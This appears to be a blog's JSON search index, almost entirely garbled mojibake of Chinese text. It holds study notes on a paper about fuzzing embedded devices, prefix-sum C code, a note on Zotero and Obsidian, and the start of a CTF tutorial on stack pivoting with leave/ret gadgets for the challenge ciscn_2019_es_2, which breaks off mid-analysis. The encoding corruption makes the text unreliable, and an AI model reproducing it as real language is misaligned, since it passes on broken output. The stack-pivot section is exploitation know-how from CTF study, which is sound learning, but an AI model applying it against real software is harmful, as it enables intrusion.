FEå®Œå…¨ä»¿çœŸï¼šå›ºä»¶åŠå…¶å¤–å›´è®¾å¤‡éƒ½åœ¨ PANDA ä¸­å®Œå…¨æ¨¡æ‹Ÿã€‚ Fuzzing Setup åŸºäº boofuzz æ„å»ºå®éªŒ ä½¿ç”¨ fuzzer å¼ºåˆ¶ç”Ÿæˆè¾“å…¥è¿™äº›è¾“å…¥å°†ä»¥ç»™å®šçš„æ¦‚ç‡è§¦å‘æ’å…¥çš„å†…å­˜æŸåæ¼æ´ä¹‹ä¸€ã€‚ æ·»åŠ äº†ä¸€ä¸ªç›‘è§†å™¨ï¼ˆæ´»æ€§æ£€æŸ¥ liveness checksï¼‰ï¼šåœ¨æ¯æ¬¡æ¨¡ç³Šè¾“å…¥ä¹‹åï¼Œæ¨¡ç³Šå™¨æ¥æ”¶è®¾å¤‡çš„å“åº”å¹¶è¯„ä¼°å®ƒæ˜¯å¦ç¬¦åˆé¢„æœŸçš„è¡Œä¸ºã€‚å½“æ”¶åˆ°çš„å“åº”ä¸é¢„æœŸçš„ä¸åŒæ—¶ï¼Œæˆ–è€…å½“è¿æ¥è¶…æ—¶æ—¶ï¼Œæ¨¡ç³Šå™¨æŠ¥å‘Šå´©æºƒå¹¶é‡æ–°å¯åŠ¨ç›®æ ‡ã€‚ è¿™ä¸ªç›‘è§†å™¨æ˜¯ä¸ºäº†æ£€æµ‹å¯å‘å¼æ–¹æ³•æ²¡æœ‰æ£€æµ‹åˆ°çš„å´©æºƒï¼Œä»è€Œè¯„ä¼°å¯å‘å¼æ–¹æ³•çš„æœ‰æ•ˆæ€§ Result ç›®æ ‡å¤„ç†çš„è¾“å…¥æ•°é‡ (Itot)ã€æŸåè¾“å…¥è¢«å‘é€åˆ°ç›®æ ‡çš„æ¬¡æ•° (IC)ã€æ´»æ€§æ£€æŸ¥ (DL) æ£€æµ‹åˆ°çš„æ•…éšœæ•°é‡ä»¥åŠæ•…éšœæ•°é‡ç”±å¯å‘å¼ (DH) æ£€æµ‹åˆ°ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å°†æœªæ£€æµ‹åˆ°çš„æ•…éšœæ•°è¡¨ç¤ºä¸º (DU)ã€‚ $I_C =D_L+D_H+D_U\\approx I_{tot}*P_C$ Fault Detection å®éªŒç»“æœè¡¨æ˜å¯å‘å¼æ–¹æ³•ç¡®å®äº§ç”Ÿäº†æ›´å¤šçš„å´©æºƒï¼Œä»è€Œæé«˜äº† fuzz çš„æ•ˆç‡\næ€§èƒ½ å…·æœ‰å†…å­˜è½¬å‘ (PE/MF) çš„éƒ¨åˆ†ä»¿çœŸæ­£åœ¨ä½¿æ¨¡ç³Šæµ‹è¯•å‡æ…¢ä¸€ä¸ªæ•°é‡çº§ä»¥ä¸Šã€‚è¿™ç§å¼€é”€æ˜¯ç”±å›ºä»¶å’Œè®¾å¤‡å¤–å›´è®¾å¤‡ä¹‹é—´çš„é€šä¿¡å¼•å…¥çš„ã€‚è¿™ç§å¼€é”€çš„ä¸»è¦éƒ¨åˆ†æ˜¯ç”±äº Avatar å’Œç‰©ç†è®¾å¤‡ä¹‹é—´çš„ä½å¸¦å®½è¿æ¥ï¼Œå®ƒä¾èµ–äºé€šè¿‡ USB è¿æ¥çš„æ ‡å‡† JTAG è°ƒè¯•å™¨ã€‚ Surrogates [28] å·²ç»è¡¨æ˜ï¼Œè¿™ä¸ªé—®é¢˜å¯ä»¥é€šè¿‡ä½¿ç”¨ä¸“ç”¨ç¡¬ä»¶æ¥è§£å†³ï¼Œè¿™å°†èƒ½å¤Ÿä»¥æ¥è¿‘å®æ—¶çš„é€Ÿåº¦è¿›è¡Œéƒ¨åˆ†ä»¿çœŸã€‚ è§‚å¯Ÿå•ä¸ªå¯å‘å¼ï¼Œæˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°å®ƒä»¬åœ¨ PE/MF åœºæ™¯ä¸­çš„å¼€é”€å¯ä»¥å¿½ç•¥ä¸è®¡ï¼Œå…¶ä¸­ MMIO è¯·æ±‚çš„è½¬å‘ç“¶é¢ˆå®Œå…¨å†³å®šäº†æ¨¡ç³Šå®éªŒçš„é€Ÿåº¦ã€‚ç„¶è€Œï¼Œåœ¨ PE/PM å’Œ FE åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ° PC = 0 çš„å¯å‘å¼åˆ†æä»£ç å¸¦æ¥äº†ç›¸å½“å¤§çš„æ”¾ç¼“ (åœ¨ x1.5 åˆ° x6 ä¹‹é—´)ã€‚ å¦ä¸€ä¸ªé‡è¦çš„è§‚å¯Ÿç»“æœæ˜¯ï¼Œåªè¦æ£€æµ‹åˆ°çš„æŸåé‡è¾ƒä½ï¼Œé’ˆå¯¹å®Œå…¨æ¨¡æ‹Ÿç›®æ ‡çš„æ¨¡ç³Šå¤„ç†é€Ÿåº¦æ˜æ˜¾å¿«äºé’ˆå¯¹ç‰©ç†è®¾å¤‡çš„æ¨¡ç³Šå¤„ç†ã€‚è¿™ä¸»è¦æ˜¯ç”±äºä¸‰ä¸ªå› ç´ ã€‚é¦–å…ˆï¼ŒTCP ä¸Šçš„é€šä¿¡æ¯”ä¸²è¡Œç«¯å£ä¸Šçš„é€šä¿¡å…è®¸æ›´é«˜çš„ååé‡ã€‚ç¬¬äºŒï¼Œå³ä½¿å›ºä»¶æ˜¯ä»¿çœŸçš„ï¼Œä»¿çœŸå™¨é€šå¸¸æ¯” (ä½èµ„æº) åµŒå…¥å¼è®¾å¤‡å…·æœ‰æ›´é«˜çš„æ—¶é’Ÿé€Ÿåº¦ã€‚ç¬¬ä¸‰ï¼Œæ£€æµ‹åˆ°çš„æŸåä¸å¼ºåˆ¶é‡æ–°å¯åŠ¨ç›®æ ‡æœ‰å…³ï¼Œè¿™æ„å‘³ç€é«˜å®¹é‡çš„ pc ä¼šå¯¼è‡´èŠ±è´¹å¤§é‡æ—¶é—´é‡æ–°å¯åŠ¨ï¼Œè€Œä¸æ˜¯å‘ç›®æ ‡å‘é€æ–°çš„è¾“å…¥ã€‚ ç„¶è€Œï¼Œæˆ‘ä»¬å®éªŒä¸­æœ€é‡è¦çš„ç»“æœæ˜¯ï¼Œåœ¨å¯ç”¨ç»„åˆå¯å‘å¼çš„ PANDA (å®Œå…¨ä»¿çœŸ) ä¸­æ‰§è¡Œçš„å›ºä»¶åœ¨ PC çš„å®é™…å€¼ä¸‹å¯ä»¥æ¯”åŸå§‹åµŒå…¥å¼è®¾å¤‡æ›´å¿«åœ°æ¨¡ç³ŠåŒ–ã€‚è™½ç„¶ç¬¬ä¸€ç§æ–¹æ³•å¯ä»¥æ£€æµ‹åˆ°æˆ‘ä»¬åœ¨å…¶ä»£ç ä¸­æ’å…¥çš„æ‰€æœ‰ç±»å‹çš„æ¼æ´ï¼Œä½†ç¬¬äºŒç§æ–¹æ³•éœ€è¦ä¾èµ–äºåªèƒ½è¯†åˆ«å…¶ä¸­ä¸¤ç§æ¼æ´çš„æ´»åŠ¨æ£€æŸ¥ã€‚ DISCUSSION ä»…ä»…ä¾é æ´»æ€§æµ‹è¯•æ˜¯ä¸€ä¸ªç³Ÿç³•çš„ç­–ç•¥ã€‚ä»…ä¾é æ´»è·ƒåº¦æµ‹è¯•è¿›è¡Œæ•…éšœæ£€æµ‹æ¥æ¨¡ç³ŠåµŒå…¥å¼ç³»ç»Ÿæ˜¯ä¸€ç§å¾ˆå¯èƒ½é—æ¼è®¸å¤šæ¼æ´çš„ç³Ÿç³•ç­–ç•¥ã€‚åŒæ ·ï¼Œä¸€æ¬¡åªä½¿ç”¨ä¸€ä¸ªå¯å‘å¼æ–¹æ³•å¹¶ä¸èƒ½ä¿è¯æ£€æµ‹åˆ°æ›´å¤šçš„æ¼æ´ã€‚ç›´è§‚åœ°è¯´ï¼Œé€šè¿‡ç»“åˆå‡ ç§å¯å‘å¼æ–¹æ³•å¯ä»¥è¾¾åˆ°è…è´¥æ£€æµ‹çš„æœ€é«˜æ½œåŠ›ã€‚ å®Œå…¨ä»¿çœŸæ¨¡æ‹Ÿå™¨å¾ˆå°‘ éƒ¨åˆ†ä»¿çœŸé€Ÿåº¦æ…¢â€”â€”ä¸€ä¸ªæ•°é‡çº§ è¿™é¡¹å·¥ä½œä¹Ÿé€‚ç”¨äºåµŒå…¥å¼è®¾å¤‡å›ºä»¶ä¸Šçš„äºŒè¿›åˆ¶ç¬¦å·æ‰§è¡Œã€‚å¦‚æœæ²¡æœ‰åŠæ—¶æ£€æµ‹åˆ°æŸåï¼Œç¬¦å·æ‰§è¡Œå¯èƒ½ä¼šèŠ±è´¹å¤§é‡æ—¶é—´æ¥è®¡ç®—æ— ç”¨çŠ¶æ€ã€‚ ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/what-you-corrupt-is-not-what-you-crash-challenges-in-fuzzing-embedded-devices/","summary":"ä½ ç ´åçš„ä¸æ˜¯ä½ ç ´åçš„: Fuzzing åµŒå…¥å¼è®¾å¤‡çš„æŒ‘æˆ˜ ä½œè€…ï¼šMarius Muench å•ä½ï¼šå·´é»é«˜ç­‰ç”µä¿¡å­¦é™¢ å›½å®¶ï¼š #æ³•å›½ å¹´ä»½ï¼š #2018å¹´ æ¥æºï¼š #NDSSä¼šè®® å…³é”®å­—ï¼š","title":"What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices"},{"content":"[[What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices]] å‚è€ƒï¼šæµ…è°ˆå›ºä»¶Fuzz_é»‘å®¢æŠ€æœ¯ (hackdig.com)\nåµŒå…¥å¼è®¾å¤‡åˆ†ç±» åŸºäºÂ LinuxÂ OSÂ çš„åµŒå…¥å¼è®¾å¤‡ï¼šå¯¹äºåˆæ¬¡æ¥è§¦å›ºä»¶æ¼æ´æŒ–æ˜çš„è¯»è€…å¾€å¾€æ¥è§¦çš„éƒ½æ˜¯è¿™ç±»åµŒå…¥å¼è®¾å¤‡ï¼Œå¦‚å¤§éƒ¨åˆ†çš„æ‘„åƒå¤´ã€è·¯ç”±å™¨ã€‚ è‡ªå®šä¹‰æ“ä½œç³»ç»Ÿçš„åµŒå…¥å¼è®¾å¤‡ï¼šå¯èƒ½ä¸å­˜åœ¨å†…å­˜ç®¡ç†å•å…ƒ(MMU)ï¼Œä¸è¿‡å†…æ ¸å’Œç”¨æˆ·å±‚ä»ç„¶å­˜åœ¨é€»è¾‘åˆ†ç¦»ã€‚ æ²¡æœ‰æŠ½è±¡æ“ä½œç³»ç»Ÿçš„åµŒå…¥å¼è®¾å¤‡ï¼šç¼–è¯‘åçš„ä»£ç ç³»ç»Ÿç©ºé—´å’Œç”¨æˆ·ç©ºé—´æ˜¯æ··åœ¨ä¸€èµ·çš„ï¼Œä¸å­˜åœ¨å†…æ ¸ä¸ç”¨æˆ·å±‚çš„é€»è¾‘åˆ†ç¦»ã€‚ å‚è€ƒçš„åšå®¢ç»™å‡ºäº†è¿™æ ·ä¸€ä¸ªè§‚ç‚¹ï¼šå¯¹è¿™ç§ç±»å‹çš„è®¾å¤‡è¿›è¡Œ fuzz ä¼¼ä¹æœ¬æ¥å°±æ¯”è¾ƒå°‘è§ï¼Œå› ä¸ºè¯¥ç§ç±»å‹çš„è®¾å¤‡ä»£ç é‡ä¸€èˆ¬è¾ƒå°ï¼Œåªç”¨é€†å‘è¯´ä¸å®šéƒ½å¯ä»¥è¿˜åŸã€‚ å¯¹åµŒå…¥å¼è®¾å¤‡ fuzz çš„éš¾ç‚¹ é”™è¯¯æ£€æµ‹ï¼šåµŒå…¥å¼è®¾å¤‡çš„é˜²å¾¡æœºåˆ¶å°‘ï¼Œå³ä½¿è§¦å‘äº†æ¼æ´ï¼Œä½†æ˜¯ç³»ç»Ÿæ²¡æœ‰å´©æºƒï¼Œfuzz å™¨å°±å¾—ä¸åˆ°åé¦ˆï¼Œå°±ä»¥ä¸ºæ²¡æœ‰è§¦å‘æ¼æ´ã€‚ æ€§èƒ½å’Œå¯æ‰©å±•æ€§ï¼šéš¾ä»¥å¹¶è¡Œï¼Œæ¯è½®éƒ½è¦é‡å¯è®¾å¤‡ æ’æ¡© åç»­ä½œè€…é’ˆå¯¹é”™è¯¯æ£€æµ‹è¿™ä¸€ä¸ªé—®é¢˜ï¼Œå°†åµŒå…¥å¼è®¾å¤‡åˆ†ä¸ºä¸‰ç±»è¿›è¡Œæµ‹è¯•ï¼Œå°†å®ƒä»¬çš„ååº”åˆ†ä¸ºäº† 6 ç§æƒ…å†µã€‚![[What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices#Observed Behavior]]\nå¯å‘å¼æ–¹æ³•åŠ å¼ºé”™è¯¯æ£€æµ‹ æ®µè¿½è¸ª æ ¼å¼è¯´æ˜ç¬¦è·Ÿè¸ª å †å¯¹è±¡è¿½è¸ª è°ƒç”¨æ ˆè¿½è¸ª è°ƒç”¨å¸§è¿½è¸ª æ ˆå¯¹è±¡è¿½è¸ª é’ˆå¯¹åµŒå…¥å¼è®¾å¤‡ fuzz é—®é¢˜çš„ä¸€äº›æ–¹æ³• ï¼ˆä½œè€…åŸæ–‡ä¸­å¯¹æ¯ç§æ–¹æ³•éƒ½ç»™å‡ºäº†éœ€è¦çš„å·¥å…·å’Œèµ„æºï¼‰\né™æ€æ’æ¡© äºŒè¿›åˆ¶é‡å†™ ç‰©ç†é‡æ‰˜ç®¡ å…¨ä»¿çœŸ éƒ¨åˆ†ä»¿çœŸ ç¡¬ä»¶æ”¯æŒçš„æ’æ¡© å¯ç¤º è¿™ç¯‡æ–‡ç« çš„ä¸»è¦å·¥ä½œåœ¨äºä¸¤éƒ¨åˆ†\né’ˆå¯¹åµŒå…¥å¼è®¾å¤‡ç¼ºä¹é”™è¯¯æ£€æµ‹æœºåˆ¶çš„å®éªŒè®ºè¯å’Œè§£å†³æ–¹æ¡ˆ åµŒå…¥å¼è®¾å¤‡ fuzzing çš„ç°çŠ¶ç»¼è¿° æˆ‘è§‰å¾—ç¬¬ä¸€éƒ¨åˆ†å°±æ˜¯è¿™ç¯‡æ–‡ç« çš„äº®ç‚¹ï¼Œåˆ‡å…¥ç‚¹å¾ˆå¥½ã€‚å…¶æ¬¡è¿™ç¯‡æ–‡ç« ç›¸å¯¹äºå…¶ä»–å¼€å‘ä¸€å¥— fuzz æ¡†æ¶ï¼Œæˆ–è€…æå‡ºæŸç§æ–¹æ³•çš„è®ºæ–‡å­¦æœ¯æ„å‘³æ›´å¼ºï¼Œå› ä¸ºå·¥ä½œé‡ä¸»è¦åœ¨å®éªŒä¸Šï¼Œæ–‡ç« æœ€åçš„å¯å‘å¼å‘æ–¹æ³•æ›´åƒæ˜¯å±•æœ›ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå…·ä½“çš„æˆæœã€‚æ‰€ä»¥è¯´å³ä½¿æ²¡æœ‰ä¸€ä¸ªå¾ˆå¥½çš„è§£å†³æ–¹æ³•ï¼Œä½†æ˜¯æå‡ºäº†é—®é¢˜å¹¶ä¸”è¯æ˜äº†é—®é¢˜çš„å­˜åœ¨ä¹Ÿå¯ä»¥å†™ä¸€ç¯‡å¾ˆå¥½çš„æ–‡ç« ã€‚\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/what-you-corrupt-is-not-what-you-crash-challenges-in-fuzzing-embedded-devices-%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/","summary":"[[What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices]] å‚è€ƒï¼šæµ…è°ˆå›ºä»¶Fuzz_é»‘å®¢æŠ€æœ¯ (hackdig.com) åµŒå…¥å¼è®¾å¤‡åˆ†ç±» åŸºäº Linux OS çš„åµŒå…¥å¼è®¾å¤‡ï¼šå¯¹äºåˆæ¬¡æ¥è§¦å›ºä»¶æ¼æ´æŒ–æ˜çš„è¯»è€…å¾€å¾€æ¥è§¦çš„éƒ½æ˜¯","title":"What You Corrupt Is Not What You Crash Challenges in Fuzzing Embedded Devices æ€»ç»“ç¬”è®°"},{"content":"å‰ç¼€å’Œ 1 2 3 4 5 //æ„å»ºå‰ç¼€å’Œæ•°ç»„ for (int i = 1; i \u0026lt;= n; i ++ ) s[i] = x + s[i - 1]; //è®¡ç®—æŸnä¸ªè¿ç»­çš„æ•°çš„å’Œ sum = s[i] - s[i - n]; å‰ç¼€å’ŒçŸ©é˜µ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //æ„å»ºå‰ç¼€å’ŒçŸ©é˜µ for (int i = 1; i \u0026lt;= n; i ++ ) for (int j = 1; j \u0026lt;= n; j ++ ) { int x; scanf(\u0026#34;%d\u0026#34;, \u0026amp;x); s[i][j] = x + s[i - 1][j] + s[i][j - 1] - s[i - 1][j - 1]; } //è®¡ç®—çŸ©é˜µå—çš„å’Œ int get_sum(int x1, int y1, int x2, int y2) { return s[x2][y2] - s[x1 - 1][y2] - s[x2][y1 - 1] + s[x1 - 1][y1 - 1]; } //è®¡ç®—çŸ©é˜µå—çš„å¤§å° int get_cnt(int x1, int y1, int x2, int y2) { return (x2 - x1 + 1) * (y2 - y1 + 1); } ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E5%89%8D%E7%BC%80%E5%92%8C%E5%89%8D%E7%BC%80%E5%92%8C%E7%9F%A9%E9%98%B5/","summary":"å‰ç¼€å’Œ 1 2 3 4 5 //æ„å»ºå‰ç¼€å’Œæ•°ç»„ for (int i = 1; i \u0026lt;= n; i ++ ) s[i] = x + s[i - 1]; //è®¡ç®—æŸnä¸ªè¿ç»­çš„æ•°çš„å’Œ sum = s[i] - s[i - n]; å‰ç¼€å’ŒçŸ©é˜µ 1 2 3 4 5 6 7 8 9 10","title":"å‰ç¼€å’Œï¼ˆå‰ç¼€å’ŒçŸ©é˜µï¼‰"},{"content":" (32æ¡æ¶ˆæ¯) æœ€æ–°zoteroä¸obsidianç¬”è®°è”åŠ¨æ•™ç¨‹ï¼ˆå¯ä»£æ›¿citationså’Œmdnotesï¼‰_qq_43309940çš„åšå®¢-CSDNåšå®¢_obsidianå’Œzotero è¿™ç¯‡åšå®¢æä¾›äº†zoteroå’Œobsidianè”åŠ¨çš„æ–¹æ¡ˆï¼ŒåŠŸèƒ½å¤§æ¦‚å°±æ˜¯å¯ä»¥åœ¨obsidianä¸­ä¸€é”®æ–°å»ºè®ºæ–‡å¯¹åº”çš„ç¬”è®°æ–‡æ¡£ï¼ŒåŒæ—¶å°†zoteroä¸­çš„æ³¨é‡ŠåŒæ­¥åˆ°obsidianä¸­ ç¼ºç‚¹1ï¼šæ¨¡æ¿ä¸å¤ªé€‚åˆæˆ‘ï¼Œç­‰åˆ°åé¢æˆ‘çš„è®ºæ–‡ç¬”è®°å½¢æˆæ¨¡å¼åè‡ªå·±å†™ä¸€ä¸‹æ¨¡æ¿ ç¼ºç‚¹2ï¼šæ–‡æ¡£å†—ä½™ä¿¡æ¯å¤šï¼Œå…³äºè®ºæ–‡çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ä»zoteroä¸­å°±å¯ä»¥çœ‹ï¼Œæ²¡å¿…è¦åŒæ­¥åˆ°ç¬”è®°ä¸­ ç¼ºç‚¹3ï¼šæˆ‘ä¸ä¹ æƒ¯ç›´æ¥åœ¨è®ºæ–‡ä¸Šåšæ³¨é‡Šï¼Œæ‰€ä»¥æ³¨é‡ŠåŒæ­¥åˆ°ç¬”è®°ä¸­è¿™ä¸ªåŠŸèƒ½å¯¹æˆ‘æ¥è¯´æ²¡å•¥ç”¨ ","permalink":"https://juhuax.github.io/posts/study/3.%E6%9D%82/%E5%90%8E%E7%BB%AD%E5%8F%AF%E8%83%BD%E6%9C%89%E7%94%A8%E7%9A%84%E8%B5%84%E6%96%99/","summary":"(32æ¡æ¶ˆæ¯) æœ€æ–°zoteroä¸obsidianç¬”è®°è”åŠ¨æ•™ç¨‹ï¼ˆå¯ä»£æ›¿citationså’Œmdnotesï¼‰_qq_43309940çš„åšå®¢-CS","title":"åç»­å¯èƒ½æœ‰ç”¨çš„èµ„æ–™"},{"content":"å‚è€ƒï¼š(17æ¡æ¶ˆæ¯) å·®åˆ† \u0026ndash;ç®—æ³•ç«èµ›ä¸“é¢˜è§£æï¼ˆ32ï¼‰ç½—å‹‡å†›çš„åšå®¢-CSDNåšå®¢\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E5%B7%AE%E5%88%86/","summary":"å‚è€ƒï¼š(17æ¡æ¶ˆæ¯) å·®åˆ† \u0026ndash;ç®—æ³•ç«èµ›ä¸“é¢˜è§£æï¼ˆ32ï¼‰ç½—å‹‡å†›çš„åšå®¢-CSDNåšå®¢","title":"å·®åˆ†"},{"content":"å‚è€ƒï¼šæ ˆè¿ç§»åŸç†ä»‹ç»ä¸åº”ç”¨ - Max1z - åšå®¢å›­ (cnblogs.com)ï¼ˆè¿™ç¯‡å†™çš„åŠå…¶è¯¦ç»†ï¼‰\né€‚ç”¨åœºæ™¯ å½“æ ˆä¸Šçš„ç©ºé—´ï¼Œæˆ–è€…ç¨‹åºçš„è¾“å…¥å­—ç¬¦æ•°é‡ä¸å¤Ÿæˆ‘ä»¬è¿›è¡Œæº¢å‡ºæ“ä½œçš„æ—¶å€™ï¼Œå¯ä»¥è¿›è¡Œæ ˆè¿ç§»ã€‚æ¯”å¦‚ä¸€èˆ¬æ ˆæº¢å‡ºçš„é¢˜ç›®éƒ½ä¼šæœ‰ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œå½“ç¨‹åºåœ¨è¯»å…¥æˆ‘ä»¬çš„è¾“å…¥çš„æ—¶å€™å°†è¯»å–çš„å­—ç¬¦æ•°é‡å†™æ­»çš„æ—¶å€™ï¼Œå¯èƒ½æˆ‘ä»¬å°±æ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´å»å¡«å…¥ ROP é“¾ã€‚\næ¦‚è¿° æ ˆè¿ç§»é¡¾åæ€ä¹‰å°±æ˜¯å°†åŸæ¥çš„ç¨‹åºæ ˆè¿ç§»åˆ°å¦ä¸€ä¸ªåœ°æ–¹ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥å°†æ„é€ çš„ ROP é“¾å®Œæ•´çš„å¡«å…¥ã€‚ é‚£ä¹ˆæƒ³è¦ä¿®æ”¹æ ˆçš„ä½ç½®ï¼Œé‚£ä¹ˆå°±éœ€è¦ä¿®æ”¹å¯„å­˜å™¨ esp å’Œ ebp çš„å€¼ã€‚ æƒ³è¦ä¿®æ”¹ esp å’Œ ebp çš„å€¼ï¼Œæˆ‘ä»¬éœ€è¦ç”¨åˆ° leave å’Œ ret ä¸¤ä¸ª gadgetã€‚\nåŸç† leave \u0026amp; ret leave å‘½ä»¤ç”±ä¸¤å¥æ±‡ç¼–æŒ‡ä»¤ç»„æˆï¼šmov esp, ebpå’Œpop ebp å®ƒå°† ebp çš„å€¼äº¤ç»™ espï¼Œç„¶åå°†æ ˆé¡¶çš„å€¼å¼¹ç»™ ebpã€‚æ“ä½œç»“æŸå esp çš„å€¼æ˜¯ old ebp+4ï¼Œebp çš„å€¼æ˜¯*old ebp ret å‘½ä»¤æ˜¯ pop rip å°†æ ˆé¡¶çš„å€¼å¼¹ç»™ rip\nä¸¤æ¬¡ leave\u0026amp;ret æˆ‘ä»¬å¯ä»¥çœ‹åˆ° leave å‘½ä»¤å¯ä»¥ä¿®æ”¹ esp å’Œ ebp å¯„å­˜å™¨ï¼Œä½†æ˜¯åªç”¨ä¸€æ¬¡ leave æ˜¯æ— æ³•åŒæ—¶ä¿®æ”¹ esp å’Œ ebp çš„ã€‚å› ä¸ºå½“æˆ‘ä»¬å°†æ ˆä¸Šçš„æ•°æ®è¦†ç›–åï¼Œæ‰§è¡Œ leaveï¼Œåªèƒ½å°†æ ˆä¸Šçš„æ•°æ® pop ç»™ ebpï¼Œè€Œ esp æ²¡æœ‰åŠæ³•ä¿®æ”¹ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡Œä¸¤æ¬¡ leaveã€‚\né¦–å…ˆæˆ‘ä»¬å¯¹æ ˆè¿›è¡Œè¦†ç›–ï¼Œå°†æ­¤æ—¶ ebp æŒ‡å‘çš„ä½ç½®ï¼ˆä¹Ÿå°±æ˜¯ä¸Šä¸€ä¸ªæ ˆå¸§çš„ ebpï¼‰è¦†ç›–ä¸ºæ ˆè¿ç§»çš„ç›®çš„åœ°å€ aï¼ˆæœªæ¥ esp ä¸­çš„å€¼ï¼‰ï¼Œreturn ä½ç½®è¦†ç›–ä¸º leave\u0026amp;ret çš„åœ°å€ã€‚ ç„¶åç¨‹åºå¼€å§‹æ‰§è¡Œï¼Œå› ä¸ºå½“å‰å‡½æ•°æ‰§è¡Œç»“æŸæ—¶æœ¬æ¥å°±è¦æ‰§è¡Œä¸€ä¸ª leave\u0026amp;retï¼Œæ‰€ä»¥è¿›è¡Œmov esp, ebpå’Œpop ebpï¼Œæ­¤æ—¶ esp ä¸­çš„å€¼æ­£å¸¸ï¼Œebp çš„å€¼å˜ä¸ºç›®æ ‡åœ°å€ aï¼ˆå› ä¸ºå°†æ ˆä¸Šçš„åœ°å€å¼¹åˆ° ebp äº†ï¼‰ æ¥ç€æ‰§è¡Œ retï¼ˆpop ripï¼‰ï¼Œå› ä¸ºæ­¤æ—¶ return çš„å€¼è¢«æˆ‘ä»¬è¦†ç›–ä¸º leave\u0026amp;ret çš„åœ°å€ï¼Œæ‰€ä»¥ç¨‹åºä¼šå†æ¬¡æ‰§è¡Œä¸€æ¬¡ leave\u0026amp;retã€‚leave æ‰§è¡Œç»“æŸåï¼Œesp ä¸­çš„å€¼æ˜¯ç›®æ ‡åœ°å€ a+4ï¼ˆå› ä¸ºè¿˜ pop ebp äº†ä¸€æ¬¡ï¼‰ï¼Œebp çš„å€¼æ— æ‰€è°“ã€‚æ¥ç€æ‰§è¡Œ retï¼Œæ‰§è¡Œç»“æŸå rip çš„å€¼æ˜¯ç›®æ ‡åœ°å€ a+4 ä¸­çš„å€¼ã€‚ è¿ç§»æˆåŠŸã€‚ æ­¤æ—¶ï¼Œå¯èƒ½å°±ä¼šå­˜åœ¨ç–‘é—®ï¼Œæ‰€ä»¥å‘¢ï¼Ÿè¿ç§»ç»“æŸäº†åˆèƒ½æ€æ ·ã€‚å®é™…ä¸Šæ ˆè¿ç§»åªæ˜¯æˆ‘ä»¬æ”»å‡»çš„ä¸€ä¸ªæ­¥éª¤ï¼Œç›®çš„å°±æ˜¯å°†ç¨‹åºçš„æ‰§è¡ŒæµåŠ«æŒåˆ°ç›®æ ‡åœ°å€ a å¤„ï¼ˆåœ¨ä¸Šé¢çš„æ­¥éª¤ä¸­å®é™…ä¸Šåº”è¯¥æ˜¯ a+4 å¤„ï¼Œä½†æ˜¯æˆ‘åªæ˜¯è¯´è¿™ä¹ˆä¸ªæ„æ€ï¼Œæ— ä¼¤å¤§é›…ï¼‰ã€‚åœ¨æ ˆè¿ç§»ä¹‹å‰ï¼Œæˆ‘ä»¬å·²ç»å°†ç›®æ ‡åœ°å€å¤„è¦†ç›–ä¸ºäº†æˆ‘ä»¬è¦æ‰§è¡Œçš„ä»£ç çš„åœ°å€ï¼Œå¹¶ä¸”æ„é€ äº† ROP é“¾ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°æˆ‘ä»¬çš„æ”»å‡»äº†ã€‚\nä¾‹é¢˜ ciscn_2019_es_2 è¿™ä¸ªé¢˜çš„ read å‡½æ•°å†™æ­»äº†è¯»å…¥ 0x30 ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å˜é‡ s è·ç¦» ebp æ˜¯ 0x28 ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æŒ‰ç…§æ™®é€šçš„æ–¹æ³•ï¼Œæˆ‘ä»¬æ„é€  payload æ˜¯ (0x28 + 4) * \u0026lsquo;a\u0026rsquo; + ret_addrï¼Œè¿™å·²ç» 0x30 ä¸ªå­—ç¬¦äº†ï¼Œæ ¹æœ¬ä¸å¤Ÿç”¨ã€‚ æ‰€ä»¥æˆ‘ä»¬è€ƒè™‘æ ˆè¿ç§»\nstep 1 å¯»æ‰¾ç›®æ ‡åœ°å€ æˆ‘ä»¬è¦ç¡®å®šç›®æ ‡åœ°å€æ˜¯å“ªé‡Œï¼Œè¿™ä¸ªé¢˜ä¸­æˆ‘ä»¬å¯ä»¥å°† s ä½œä¸ºç›®æ ‡åœ°å€ã€‚é‚£ä¹ˆæˆ‘ä»¬éœ€è¦çŸ¥é“ s ç¡®åˆ‡çš„åœ°å€ã€‚ å¦‚ä½•è·å¾— s çš„åœ°å€å‘¢ï¼Œæˆ‘ä»¬è§‚å¯Ÿä¸€ä¸‹ vlu å‡½æ•°çš„æ ˆï¼š\næ‰“å¼€ gdbï¼Œåœ¨ main å‡½æ•°å¤„ä¸‹æ–­ç‚¹ï¼Œæ‰¾ä¸€ä¸‹ vul å‡½æ•°çš„åœ°å€ åœ¨ vul å‡½æ•°å¤„ä¸‹æ–­ç‚¹ï¼Œç„¶åå•æ­¥æ­¥å…¥ï¼Œè¿›å…¥å‡½æ•° vul æŸ¥çœ‹ä¸€ä¸‹ vul çš„æ±‡ç¼– å› ä¸ºæˆ‘ä»¬æƒ³è¦çŸ¥é“ s 